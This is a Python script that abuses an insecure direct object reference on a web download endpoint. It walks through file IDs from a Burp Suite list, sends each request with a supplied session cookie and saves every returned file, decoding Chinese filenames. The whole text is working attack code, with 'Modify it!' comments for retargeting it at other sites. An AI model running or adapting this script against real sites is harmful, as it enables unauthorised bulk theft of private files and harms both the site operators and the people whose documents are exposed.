import requests
import chardet

def httpGetResponse(url=None,Headers=None):

    response = requests.get(url, headers=Headers, allow_redirects=True,stream=True)  #Stream -> For Downlaod Large Files
    return response 

url = "https://vulnweb.com/DownloadFile.ashx?ID=451158"
Headers = {'Cookie':'CbcCht_FontSize=12; ASP.NET_SessionId=HackSession; CbcCht_FontSize=12; _ga=GA1.3.2080788343.1729227592; _gid=GA1.3.1178721289.1729227592; _gat_gtag_UA_149007509_1=1; _ga_4L5WM8QRCG=GS1.1.1729227591.1.0.1729227595.0.0.0'} # Modify it!


with open("./list.txt", "r") as file:
    content = file.read()
HackListFromBurpSuit = content.split() # To List 
print(HackListFromBurpSuit)

for id in HackListFromBurpSuit:
    url = f"https://vulnweb.com/DownloadFile.ashx?ID={id}" # Modify it!


    try:
        HttpResponse = httpGetResponse(url,Headers)
    except:
        print(f"Error occurred while making the request")

    #ExtractTheFileNameValue
    contentDipositionHeader = HttpResponse.headers.get('content-disposition')

    if contentDipositionHeader:

        # Convert Response to RawBytes
        fileNameValue = contentDipositionHeader.split('filename=')[1].strip(';')
        fileNameRawByte = fileNameValue.encode('latin1') #mapping All chr -> to 2 bytes(0~255), ISO-8859-1

        # Useing Big 5 To decode Chinese chars
        try:
            fileNameAutoDecode = fileNameRawByte.decode('big5')
            print("Resutl",fileNameAutoDecode)
            with open(f"downloadFolder/{fileNameAutoDecode}", "wb") as rawFile:
                try:
                    rawFile.write(HttpResponse.content)
                except:
                    print(f"Error while writing file")
        except:
            print(f"Error while Decoding !")

        

    
        
       

   



